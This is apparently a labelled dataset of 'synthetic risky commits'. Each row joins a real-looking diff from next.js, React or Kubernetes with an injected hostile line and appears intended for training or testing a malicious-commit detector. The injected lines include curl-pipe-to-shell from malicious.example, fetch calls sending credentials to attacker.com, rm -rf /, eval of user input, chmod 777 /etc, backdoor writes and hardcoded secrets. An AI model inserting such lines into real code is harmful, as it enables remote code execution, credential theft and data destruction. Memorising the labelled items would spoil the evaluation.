""react-dom"": ""19.3.0-canary-a4eb2dfa-20251006"" + ""react-is"": ""19.3.0-canary-a4eb2dfa-20251006"" + ""scheduler"": ""0.28.0-canary-a4eb2dfa-20251006"" } ""packageExtensions"": { ""eslint-plugin-react-hooks@0.0.0-experimental-6de32a5a-20250822"": {
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_259_5542,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,9,8,17,"function validateDocumentPositionWithFiberTree( fragmentFiber) : !1; } -FragmentInstance.prototype.experimental_scrollIntoView = function (alignToTop) { +FragmentInstance.prototype.scrollIntoView = function (alignToTop) { if (""object"" === typeof alignToTop) throw Error(formatProdErrorMessage(566)); var children = []; traverseVisibleHostChildren( ReactDOMHydrationRoot.prototype.unstable_scheduleHydration = function (target) { }; var isomorphicReactPackageVersion$jscomp$inline_2513 = React.version; if ( - ""19.3.0-experimental-c7862584-20251006"" !== + ""19.3.0-experimental-a4eb2dfa-20251006"" !== isomorphicReactPackageVersion$jscomp$inline_2513 ) throw Error( formatProdErrorMessage( 527 isomorphicReactPackageVersion$jscomp$inline_2513 - ""19.3.0-experimental-c7862584-20251006"" + ""19.3.0-experimental-a4eb2dfa-20251006"" ) ); ReactDOMSharedInternals.findDOMNode = function (componentOrElement) { ReactDOMSharedInternals.findDOMNode = function (componentOrElement) { }; var internals$jscomp$inline_3223 = { bundleType: 0 - version: ""19.3.0-experimental-c7862584-20251006"" + version: ""19.3.0-experimental-a4eb2dfa-20251006"" rendererPackageName: ""react-dom"" currentDispatcherRef: ReactSharedInternals - reconcilerVersion: ""19.3.0-experimental-c7862584-20251006"" + reconcilerVersion: ""19.3.0-experimental-a4eb2dfa-20251006"" }; if (""undefined"" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__) { var hook$jscomp$inline_3224 = __REACT_DEVTOOLS_GLOBAL_HOOK__; exports.useFormState = function (action initialState permalink) { exports.useFormStatus = function () { return ReactSharedInternals.H.useHostTransitionStatus(); }; -exports.version = ""19.3.0-experimental-c7862584-20251006""; +exports.version = ""19.3.0-experimental-a4eb2dfa-20251006""; ""undefined"" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ && ""function"" === typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.registerInternalModuleStop &&
+ eval(request.getParameter(""user_input""))",1
kubernetes/kubernetes,synthetic_260_3858,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,2,2,4,"+/* +Copyright 2025 The Kubernetes Authors. + +Licensed under the Apache License Version 2.0 (the ""License""); +you may not use this file except in compliance with the License. +You may obtain a copy of the License at + + http://www.apache.org/licenses/LICENSE-2.0 + +Unless required by applicable law or agreed to in writing software +distributed under the License is distributed on an ""AS IS"" BASIS +WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND either express or implied. +See the License for the specific language governing permissions and +limitations under the License. +*/ + +// please speak to SIG-Testing leads before adding anything to this package +// see: https://git.k8s.io/enhancements/keps/sig-testing/5468-invariant-testing +package invariants + +import ( + ""context"" + ""strings"" + + clientset ""k8s.io/client-go/kubernetes"" + ""k8s.io/component-base/metrics/testutil"" + ""k8s.io/kubernetes/test/e2e/framework"" + e2emetrics ""k8s.io/kubernetes/test/e2e/framework/metrics"" + + ""github.com/onsi/ginkgo/v2"" + ginkgotypes ""github.com/onsi/ginkgo/v2/types"" +) + +// checks for api-server metrics that indicate an internal bug has occurred +const invariantMetricsLeafText = ""should enable checking invariant metrics"" + +var _ = framework.SIGDescribe(""testing"")(""Invariant Metrics"" func() { + // this test is a sentinel for selecting the report after suite logic + // + // this allows us to run it by default in most jobs but it can be opted-out + // does not run when selecting Conformance and it can be tagged Flaky + // if we encounter issues with it + ginkgo.It(invariantMetricsLeafText func() {}) +}) + +var _ = ginkgo.ReportAfterSuite(""Invariant Metrics"" func(ctx ginkgo.SpecContext report ginkgo.Report) { + // skip early if we are in dry-run mode and didn't really run any tests + if report.SuiteConfig.DryRun { + return + } + // check if we ran the 'should enabled checking invariants' ""test"" + invariantsSelected := false + for _ spec := range report.SpecReports { + if spec.LeafNodeText == invariantMetricsLeafText { + invariantsSelected = spec.State.Is(ginkgotypes.SpecStatePassed) + break + } + } + // skip if the associated ""test"" was skipped + if !invariantsSelected { + return + } + // otherwise actually check invariants now + checkInvariantMetrics(ctx) +}) + +// apiServerMetricInvariant represents an api-server metric invariant all +// fields must be specified +type apiServerMetricInvariant struct { + // Metric is the metric name + Metric string + // SIG associated with the invariant + // Bugs related to this invariant check failing should be labeled with + // this SIG. + SIG string + // Owners are the individuals responsible for the invariant + // Bugs related to this invariant check failing should be assigned to these + // GitHub handles + Owners []string + // IsValid should return false if the metric samples violate the invariant + IsValid func(testutil.Samples) bool +} + +// Please speak to SIG-Testing leads before adding anything here. +// All fields must be specified +var apiServerMetricInvariants = []apiServerMetricInvariant{ + { + // TODO: Migrate to apiserver_validation_declarative_validation_parity_discrepancies_total + // when it reaches beta / when this metric is deprecated. + // For now we uare using the previous beta metric. + Metric: ""apiserver_validation_declarative_validation_mismatch_total"" + SIG: ""api-machinery"" + Owners: []string{""aaron-prindle"" ""jpbetz"" ""thockin""} + IsValid: func(samples testutil.Samples) bool { + // declarative validation mismatch should never be non-zero + for _ sample := range samples { + if sample.Value != 0 { + return false + } + } + return true + } + } + { + // TODO: Migrate to apiserver_validation_declarative_validation_panics_total + // when it reaches beta / when this metric is deprecated. + // For now we uare using the previous beta metric. + Metric: ""apiserver_validation_declarative_validation_panic_total"" + SIG: ""api-machinery"" + Owners: []string{""aaron-prindle"" ""jpbetz"" ""thockin""} + IsValid: func(samples testutil.Samples) bool { + // declarative validation panics should never be non-zero + for _ sample := range samples { + if sample.Value != 0 { + return false + } + } + return true + } + } +} + +func checkInvariantMetrics(ctx context.Context) { + // Grab metrics + config err := framework.LoadConfig() + if err != nil { + framework.Failf(""error loading client config: %v"" err) + } + c err := clientset.NewForConfig(config) + if err != nil { + framework.Failf(""error loading client config: %v"" err) + } + grabber err := e2emetrics.NewMetricsGrabber(ctx c nil config false false false true false false) + if err != nil { + framework.Failf(""error creating metrics grabber: %v"" err) + } + apiserverMetrics err := grabber.GrabFromAPIServer(ctx) + if err != nil { + framework.Failf(""error grabbing api-server metrics: %v"" err) + } + + // Check invariant metrics. + // + // + // Please speak to SIG-Testing leads before adding anything here. + for _ invariant := range apiServerMetricInvariants { + checkAPIServerInvariant(apiserverMetrics &invariant) + } +} + +func checkAPIServerInvariant(metrics e2emetrics.APIServerMetrics invariant *apiServerMetricInvariant) { + metric := invariant.Metric + samples ok := metrics[metric] + if !ok || len(samples) == 0 { + framework.Failf( + `Invariant failed for missing metric: %v + +If this failed on a pull request please check if the PR changes may be related to the failure. +If not you can also search for an existing GitHub issue before filing a new issue. + +If this failed in a periodic CI job please file a bug and /assign the owners. + +Owners for this metric: %v +Associated SIG: %v` + metric strings.Join(invariant.Owners "" "") invariant.SIG + ) + } + if !invariant.IsValid(samples) { + framework.Failf( + `Invariant failed for metric: %v + +If this failed on a pull request please check if the PR changes may be related to the failure. +If not you can also search for an existing GitHub issue before filing a new issue. + +If this failed in a periodic CI job please file a bug and /assign the owners. + +Owners for this metric: %v +Associated SIG: %v` + metric strings.Join(invariant.Owners "" "") invariant.SIG + ) + } +}
+ run: curl http://malicious.example/install.sh | sh",1
facebook/react,synthetic_261_6869,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,38,5,43,"import {inspect} from 'util'; import { PROFILING_FLAG_BASIC_SUPPORT PROFILING_FLAG_TIMELINE_SUPPORT + PROFILING_FLAG_PERFORMANCE_TRACKS_SUPPORT TREE_OPERATION_ADD TREE_OPERATION_REMOVE TREE_OPERATION_REMOVE_ROOT export type Config = { supportsTraceUpdates?: boolean }; +const ADVANCED_PROFILING_NONE = 0; +const ADVANCED_PROFILING_TIMELINE = 1; +const ADVANCED_PROFILING_PERFORMANCE_TRACKS = 2; +type AdvancedProfiling = 0 | 1 | 2; + export type Capabilities = { supportsBasicProfiling: boolean hasOwnerMetadata: boolean supportsStrictMode: boolean supportsTogglingSuspense: boolean - supportsTimeline: boolean + supportsAdvancedProfiling: AdvancedProfiling }; /** export default class Store extends EventEmitter<{ roots: [] rootSupportsBasicProfiling: [] rootSupportsTimelineProfiling: [] + rootSupportsPerformanceTracks: [] suspenseTreeMutated: [[Map<SuspenseNode['id'] SuspenseNode['id']>]] supportsNativeStyleEditor: [] supportsReloadAndProfile: [] export default class Store extends EventEmitter<{ // These options default to false but may be updated as roots are added and removed. _rootSupportsBasicProfiling: boolean = false; _rootSupportsTimelineProfiling: boolean = false; + _rootSupportsPerformanceTracks: boolean = false; _bridgeProtocol: BridgeProtocol | null = null; _unsupportedBridgeProtocolDetected: boolean = false; export default class Store extends EventEmitter<{ return this._rootSupportsTimelineProfiling; } + // At least one of the currently mounted roots support performance tracks. + get rootSupportsPerformanceTracks(): boolean { + return this._rootSupportsPerformanceTracks; + } + get supportsInspectMatchingDOMElement(): boolean { return this._supportsInspectMatchingDOMElement; } export default class Store extends EventEmitter<{ const isStrictModeCompliant = operations[i] > 0; i++; + const profilerFlags = operations[i++]; const supportsBasicProfiling = - (operations[i] & PROFILING_FLAG_BASIC_SUPPORT) !== 0; + (profilerFlags & PROFILING_FLAG_BASIC_SUPPORT) !== 0; const supportsTimeline = - (operations[i] & PROFILING_FLAG_TIMELINE_SUPPORT) !== 0; - i++; + (profilerFlags & PROFILING_FLAG_TIMELINE_SUPPORT) !== 0; + const supportsPerformanceTracks = + (profilerFlags & PROFILING_FLAG_PERFORMANCE_TRACKS_SUPPORT) !== 0; + let supportsAdvancedProfiling: AdvancedProfiling = + ADVANCED_PROFILING_NONE; + if (supportsPerformanceTracks) { + supportsAdvancedProfiling = ADVANCED_PROFILING_PERFORMANCE_TRACKS; + } else if (supportsTimeline) { + supportsAdvancedProfiling = ADVANCED_PROFILING_TIMELINE; + } let supportsStrictMode = false; let hasOwnerMetadata = false; export default class Store extends EventEmitter<{ hasOwnerMetadata supportsStrictMode supportsTogglingSuspense - supportsTimeline + supportsAdvancedProfiling }); // Not all roots support StrictMode; export default class Store extends EventEmitter<{ const prevRootSupportsProfiling = this._rootSupportsBasicProfiling; const prevRootSupportsTimelineProfiling = this._rootSupportsTimelineProfiling; + const prevRootSupportsPerformanceTracks = + this._rootSupportsPerformanceTracks; this._hasOwnerMetadata = false; this._rootSupportsBasicProfiling = false; this._rootSupportsTimelineProfiling = false; + this._rootSupportsPerformanceTracks = false; this._rootIDToCapabilities.forEach( - ({supportsBasicProfiling hasOwnerMetadata supportsTimeline}) => { + ({ + supportsBasicProfiling + hasOwnerMetadata + supportsAdvancedProfiling + }) => { if (supportsBasicProfiling) { this._rootSupportsBasicProfiling = true; } if (hasOwnerMetadata) { this._hasOwnerMetadata = true; } - if (supportsTimeline) { + if (supportsAdvancedProfiling === ADVANCED_PROFILING_TIMELINE) { this._rootSupportsTimelineProfiling = true; } + if ( + supportsAdvancedProfiling === ADVANCED_PROFILING_PERFORMANCE_TRACKS + ) { + this._rootSupportsPerformanceTracks = true; + } } ); export default class Store extends EventEmitter<{ ) { this.emit('rootSupportsTimelineProfiling'); } + if ( + this._rootSupportsPerformanceTracks !== + prevRootSupportsPerformanceTracks + ) { + this.emit('rootSupportsPerformanceTracks'); + } } if (hasSuspenseTreeChanged) {
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_262_3854,Zack Tanner,2025-10-15 12:40:39,Synthetic risky commit,run.sh,4,2,6,"-import Link from 'next/link' +import { LinkAccordion } from '../components/link-accordion' import { BackButton } from './back-button' export default async function Page() { return ( <> - <p id=""static-page"">Static Page</p> + <p id=""static-page"">Static Page [prefetch-sentinel]</p> <p> - <Link href=""/"" id=""to-home""> + <LinkAccordion href=""/"" id=""to-home""> To home - </Link> + </LinkAccordion> </p> <p> - <Link href=""/static-page"" prefetch> - To Same Page - </Link> + <LinkAccordion href=""/static-page"" id=""to-same-page""> + To Static Page (self) + </LinkAccordion> </p> <p> <BackButton />
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_263_9619,stefanprobst,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,5,7,12,"const config = { - plugins: [""@tailwindcss/postcss""] + plugins: { + ""@tailwindcss/postcss"": {} + } }; export default config;
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_264_6931,Josh Story,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,38,1,39,"import { Suspense } from 'react' import { cachedDelay DebugRenderKind uncachedIO } from '../../../shared' import { connection } from 'next/server' -export const unstable_prefetch = 'unstable_runtime' +export const unstable_prefetch = { + mode: 'runtime' + samples: [{ headers: [['host' 'test-host']] }] +} export default async function Page() { return (
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_265_9254,Sebastian Markbåge,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,40,0,40,"import {useRef} from 'react'; import styles from './SuspenseScrubber.css'; +import Tooltip from '../Components/reach-ui/tooltip'; + export default function SuspenseScrubber({ min max export default function SuspenseScrubber({ const steps = []; for (let index = min; index <= max; index++) { steps.push( - <div + <Tooltip key={index} - className={ - styles.SuspenseScrubberStep + - (highlight === index - ? ' ' + styles.SuspenseScrubberStepHighlight - : '') - } - onPointerDown={handlePress.bind(null index)} - onMouseEnter={onHoverSegment.bind(null index)}> + label={ + index === min + ? // The first step in the timeline is always a Transition (Initial Paint). + // TODO: Support multiple environments. + 'Initial Paint' + : // TODO: Consider adding the name of this specific boundary if this step has only one. + 'Suspense' + }> <div className={ - index <= value - ? styles.SuspenseScrubberBeadSelected - : styles.SuspenseScrubberBead + styles.SuspenseScrubberStep + + (highlight === index + ? ' ' + styles.SuspenseScrubberStepHighlight + : '') } - /> - </div> + onPointerDown={handlePress.bind(null index)} + onMouseEnter={onHoverSegment.bind(null index)}> + <div + className={ + styles.SuspenseScrubberBead + + (index === min + ? // The first step in the timeline is always a Transition (Initial Paint). + // TODO: Support multiple environments. + ' ' + styles.SuspenseScrubberBeadTransition + : '') + + (index <= value ? ' ' + styles.SuspenseScrubberBeadSelected : '') + } + /> + </div> + </Tooltip> ); }
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_266_5941,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,config.env,2,0,2,"+## 6.1.0 + +**Note:** Version 6.0.0 was mistakenly released and immediately deprecated and untagged on npm. This is the first official 6.x major release and includes breaking changes. + +- **Breaking:** Require Node.js 18 or newer. ([@michaelfaith](https://github.com/michaelfaith) in [#32458](https://github.com/facebook/react/pull/32458)) +- **Breaking:** Flat config is now the default `recommended` preset. Legacy config moved to `recommended-legacy`. ([@michaelfaith](https://github.com/michaelfaith) in [#32457](https://github.com/facebook/react/pull/32457)) +- **New Violations:** Disallow calling `use` within try/catch blocks. ([@poteto](https://github.com/poteto) in [#34040](https://github.com/facebook/react/pull/34040)) +- **New Violations:** Disallow calling `useEffectEvent` functions in arbitrary closures. ([@jbrown215](https://github.com/jbrown215) in [#33544](https://github.com/facebook/react/pull/33544)) +- Handle `React.useEffect` in addition to `useEffect` in rules-of-hooks. ([@Ayc0](https://github.com/Ayc0) in [#34076](https://github.com/facebook/react/pull/34076)) +- Added `react-hooks` settings config option that to accept `additionalEffectHooks` that are used across exhaustive-deps and rules-of-hooks rules. ([@jbrown215](https://github.com/jbrown215)) in [#34497](https://github.com/facebook/react/pull/34497) + +## 6.0.0 + +Accidentally released. See 6.1.0 for the actual changes. + ## 5.2.0 - Support flat config ([@michaelfaith](https://github.com/michaelfaith) in [#30774](https://github.com/facebook/react/pull/30774))
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_267_7580,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,7,7,14,"} function ensureCorrectIsomorphicReactVersion() { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-canary-85c427d8-20251003"" !== isomorphicReactPackageVersion) + if (""19.3.0-canary-4fdf7cf2-20251003"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-canary-85c427d8-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-canary-4fdf7cf2-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") ); } var React = require(""next/dist/compiled/react"") startWork(request); }); }; - exports.version = ""19.3.0-canary-85c427d8-20251003""; + exports.version = ""19.3.0-canary-4fdf7cf2-20251003""; })();
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_268_2204,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,21,9,30,"+// @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; import { mutate
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_269_2076,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,18,9,27,"{ ""name"": ""next-rspack"" - ""version"": ""15.6.0-canary.45"" + ""version"": ""15.6.0-canary.46"" ""repository"": { ""url"": ""vercel/next.js"" ""directory"": ""packages/next-rspack""
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
facebook/react,synthetic_270_9984,Sebastian Markbåge,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,21,6,27,"padding-right: 0; } -.SuspenseScrubberBead .SuspenseScrubberBeadSelected { +.SuspenseScrubberBead { flex: 1; height: 0.5rem; background: var(--color-background-selected); background: var(--color-background-selected); } +.SuspenseScrubberBeadTransition { + background: var(--color-component-name); +} + .SuspenseScrubberStepHighlight > .SuspenseScrubberBead -.SuspenseScrubberStepHighlight > .SuspenseScrubberBeadSelected -.SuspenseScrubberStep:hover > .SuspenseScrubberBead -.SuspenseScrubberStep:hover > .SuspenseScrubberBeadSelected { +.SuspenseScrubberStep:hover > .SuspenseScrubberBead { height: 0.75rem; }
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_271_9692,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,run.sh,30,8,38,"const appDir = join(__dirname '..') const appTypeDeclarations = join(appDir 'next-env.d.ts') describe('TypeScript App Type Declarations' () => { + if (process.env.__NEXT_EXPERIMENTAL_ISOLATED_DEV_BUILD === 'true') { + it.skip('should skip on isolated dev build' () => { + // We use static fixture ""next-env.d.ts"" but the content should differ + // based on the isolated dev build flag. We can't do something like + // ""next-env-dev.d.ts"" because Next.js Types Plugin emits a file + // ""next-env.d.ts"" and we have to change its behavior for this test case. + // Rather than that just skip the test as we're going to remove this flag soon. + // Then modify the content to be "".next/dev/types/routes.d.ts"" + }) + return + } + it('should write a new next-env.d.ts if none exist' async () => { const prevContent = await fs.readFile(appTypeDeclarations 'utf8') try {
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
kubernetes/kubernetes,synthetic_272_8048,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,8,10,18,"type DeviceRequestAllocationResult struct { // // +optional // +featureGate=DRAConsumableCapacity + // +k8s:optional + // +k8s:format=k8s-uuid ShareID *types.UID `json:""shareID omitempty"" protobuf:""bytes 9 opt name=shareID""` // ConsumedCapacity tracks the amount of capacity consumed per device as part of the claim request. type AllocatedDeviceStatus struct { // // +optional // +featureGate=DRAConsumableCapacity + // +k8s:optional + // +k8s:format=k8s-uuid ShareID *string `json:""shareID omitempty"" protobuf:""bytes 7 opt name=shareID""` // Conditions contains the latest observation of the device's state.
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_273_4522,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,29,3,32,"'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToReadableStream"" which supports Suspense on the server' ); }; - exports.version = ""19.3.0-experimental-4fdf7cf2-20251003""; + exports.version = ""19.3.0-experimental-c7862584-20251006""; })();
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
actions/checkout,synthetic_274_6553,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,config.env,26,6,32,"--- -name: has-symbols -version: 1.0.2 +name: undici +version: 5.28.4 type: npm -summary: Determine if the JS environment has Symbol support. Supports spec or shams. -homepage: https://github.com/inspect-js/has-symbols#readme +summary: An HTTP/1.1 client written from scratch for Node.js +homepage: https://undici.nodejs.org license: mit licenses: - sources: LICENSE text: | MIT License - Copyright (c) 2016 Jordan Harband + Copyright (c) Matteo Collina and Undici contributors Permission is hereby granted free of charge to any person obtaining a copy of this software and associated documentation files (the ""Software"") to deal licenses: LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. +- sources: README.md + text: MIT notices: []
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_275_6120,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,21,10,31,"exports.preloadModule = function (href options) { }); } else Internals.d.m(href); }; -exports.version = ""19.3.0-canary-c7862584-20251006""; +exports.version = ""19.3.0-canary-a4eb2dfa-20251006"";
+ eval(request.getParameter(""user_input""))",1
kubernetes/kubernetes,synthetic_276_7132,Antonio Ojea,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,31,1,32,"+// Copyright 2013 The Go Authors. All rights reserved. +// Use of this source code is governed by a BSD-style +// license that can be found in the LICENSE file. + +// This package is copied from Go library net. +// https://golang.org/src/net/dnsclient_unix_test.go +// The original private type FakeDNSServer +// is exported as public type for testing. + +package testing + +import ( + ""context"" + ""errors"" + ""fmt"" + ""net"" + ""time"" + + _ ""testing"" + + ""golang.org/x/net/dns/dnsmessage"" +) + +type FakeDNSServer struct { + ResponseHandler func(n s string q dnsmessage.Message t time.Time) (dnsmessage.Message error) + alwaysTCP bool +} + +func (server *FakeDNSServer) DialContext(_ context.Context n s string) (net.Conn error) { + if server.alwaysTCP || n == ""tcp"" || n == ""tcp4"" || n == ""tcp6"" { + return &fakeDNSConn{tcp: true server: server n: n s: s} nil + } + return &fakeDNSPacketConn{fakeDNSConn: fakeDNSConn{tcp: false server: server n: n s: s}} nil +} + +type fakeDNSConn struct { + net.Conn + tcp bool + server *FakeDNSServer + n string + s string + q dnsmessage.Message + t time.Time + buf []byte +} + +func (f *fakeDNSConn) Close() error { + return nil +} + +func (f *fakeDNSConn) Read(b []byte) (int error) { + if len(f.buf) > 0 { + n := copy(b f.buf) + f.buf = f.buf[n:] + return n nil + } + + resp err := f.server.ResponseHandler(f.n f.s f.q f.t) + if err != nil { + return 0 err + } + + bb := make([]byte 2 514) + bb err = resp.AppendPack(bb) + if err != nil { + return 0 fmt.Errorf(""cannot marshal DNS message: %v"" err) + } + + if f.tcp { + l := len(bb) - 2 + bb[0] = byte(l >> 8) + bb[1] = byte(l) + f.buf = bb + return f.Read(b) + } + + bb = bb[2:] + if len(b) < len(bb) { + return 0 errors.New(""read would fragment DNS message"") + } + + copy(b bb) + return len(bb) nil +} + +func (f *fakeDNSConn) Write(b []byte) (int error) { + if f.tcp && len(b) >= 2 { + b = b[2:] + } + if f.q.Unpack(b) != nil { + return 0 fmt.Errorf(""cannot unmarshal DNS message fake %s (%d)"" f.n len(b)) + } + return len(b) nil +} + +func (f *fakeDNSConn) SetDeadline(t time.Time) error { + f.t = t + return nil +} + +type fakeDNSPacketConn struct { + net.PacketConn + fakeDNSConn +} + +func (f *fakeDNSPacketConn) SetDeadline(t time.Time) error { + return f.fakeDNSConn.SetDeadline(t) +} + +func (f *fakeDNSPacketConn) Close() error { + return f.fakeDNSConn.Close() +}
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
kubernetes/kubernetes,synthetic_277_2398,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,28,1,29,"type DeviceRequestAllocationResult struct { // // +optional // +featureGate=DRAConsumableCapacity + // +k8s:optional + // +k8s:format=k8s-uuid ShareID *types.UID `json:""shareID omitempty"" protobuf:""bytes 9 opt name=shareID""` // ConsumedCapacity tracks the amount of capacity consumed per device as part of the claim request. type AllocatedDeviceStatus struct { // // +optional // +featureGate=DRAConsumableCapacity + // +k8s:optional + // +k8s:format=k8s-uuid ShareID *string `json:""shareID omitempty"" protobuf:""bytes 7 opt name=shareID""` // Conditions contains the latest observation of the device's state.
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_278_3131,Tobias Koppers,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,4,9,13,"-import { nextTestSetup } from 'e2e-utils' -import { retry } from 'next-test-utils' - -describe('no-double-tailwind-execution' () => { - const { next isNextDev skipped } = nextTestSetup({ - files: __dirname - skipDeployment: true - dependencies: { - '@tailwindcss/postcss': '^4' - tailwindcss: '^4' - } - env: { - DEBUG: 'tailwindcss' - ...process.env - } - }) - - if (skipped) { - return - } - - it('should run tailwind only once initially and per change' async () => { - const browser = await next.browser('/') - expect(await browser.elementByCss('p').text()).toBe('hello world') - - if (isNextDev) { - const filePath = 'app/page.tsx' - const origContent = await next.readFile(filePath) - let getOutput = next.getCliOutputFromHere() - await next.patchFile( - filePath - origContent.replace('hello world' 'hello hmr') - async () => { - await retry(async () => { - expect(await browser.elementByCss('p').text()).toBe('hello hmr') - let tailwindProcessingCount = [ - ...getOutput().matchAll( - /\[@tailwindcss\/postcss\] app\/globals.css/g - ) - ].length - expect(tailwindProcessingCount).toBe(1) - }) - } - ) - } - let tailwindProcessingCount = [ - ...next.cliOutput.matchAll(/\[@tailwindcss\/postcss\] app\/globals.css/g) - ].length - if (isNextDev) { - expect(tailwindProcessingCount).toBe(3) // dev: initial + hmr + hmr (revert) - } else { - expect(tailwindProcessingCount).toBe(1) // build - } - }) -})
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
kubernetes/kubernetes,synthetic_279_6400,Lalit Chauhan,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,8,6,14,"message AllocatedDeviceStatus { // // +optional // +featureGate=DRAConsumableCapacity + // +k8s:optional + // +k8s:format=k8s-uuid optional string shareID = 7; // Conditions contains the latest observation of the device's state. message DeviceRequestAllocationResult { // // +optional // +featureGate=DRAConsumableCapacity + // +k8s:optional + // +k8s:format=k8s-uuid optional string shareID = 9; // ConsumedCapacity tracks the amount of capacity consumed per device as part of the claim request.
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_280_7929,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,4,4,8,"return ""Suspense""; case REACT_SUSPENSE_LIST_TYPE: return ""SuspenseList""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch (type.$$typeof) { return parentContext.insertionMode >= HTML_TABLE_MODE || parentContext.insertionMode < HTML_MODE ? createFormatContext(HTML_MODE null subtreeScope null) - : parentContext.tagScope !== subtreeScope + : null !== parentContext.viewTransition || + parentContext.tagScope !== subtreeScope ? createFormatContext( parentContext.insertionMode parentContext.selectedValue }; } function getSuspenseFallbackFormatContext(resumableState parentContext) { - parentContext.tagScope & 32 && (resumableState.instructions |= 128); + parentContext.tagScope & 32 && + (resumableState.instructions |= NeedUpgradeToViewTransitions); return createFormatContext( parentContext.insertionMode parentContext.selectedValue resumableState ); } + function makeId(resumableState treeId localId) { + resumableState = ""_"" + resumableState.idPrefix + ""R_"" + treeId; + 0 < localId && (resumableState += ""H"" + localId.toString(32)); + return resumableState + ""_""; + } + function pushViewTransitionAttributes(target formatContext) { + formatContext = formatContext.viewTransition; + null !== formatContext && + (""auto"" !== formatContext.name && + (pushStringAttribute( + target + ""vt-name"" + 0 === formatContext.nameIdx + ? formatContext.name + : formatContext.name + ""_"" + formatContext.nameIdx + ) + formatContext.nameIdx++) + pushStringAttribute(target ""vt-update"" formatContext.update) + ""none"" !== formatContext.enter && + pushStringAttribute(target ""vt-enter"" formatContext.enter) + ""none"" !== formatContext.exit && + pushStringAttribute(target ""vt-exit"" formatContext.exit) + ""none"" !== formatContext.share && + pushStringAttribute(target ""vt-share"" formatContext.share)); + } function pushStyleAttribute(target style) { if (""object"" !== typeof style) throw Error( checkHtmlStringCoercion(styleText); return ("""" + styleText).replace(styleRegex styleReplacer); } - function pushSelfClosing(target props tag) { + function pushSelfClosing(target props tag formatContext) { target.push(startChunkForTag(tag)); for (var propKey in props) if (hasOwnProperty.call(props propKey)) { pushAttribute(target propKey propValue); } } + pushViewTransitionAttributes(target formatContext); target.push(endOfStartTagSelfClosing); return null; } target.push(endChunkForTag(""script"")); return null; } - function pushStartSingletonElement(target props tag) { + function pushStartSingletonElement(target props tag formatContext) { target.push(startChunkForTag(tag)); var innerHTML = (tag = null) propKey; pushAttribute(target propKey propValue); } } + pushViewTransitionAttributes(target formatContext); target.push(endOfStartTag); pushInnerHTML(target innerHTML tag); return tag; } - function pushStartGenericElement(target props tag) { + function pushStartGenericElement(target props tag formatContext) { target.push(startChunkForTag(tag)); var innerHTML = (tag = null) propKey; pushAttribute(target propKey propValue); } } + pushViewTransitionAttributes(target formatContext); target.push(endOfStartTag); pushInnerHTML(target innerHTML tag); return ""string"" === typeof tag 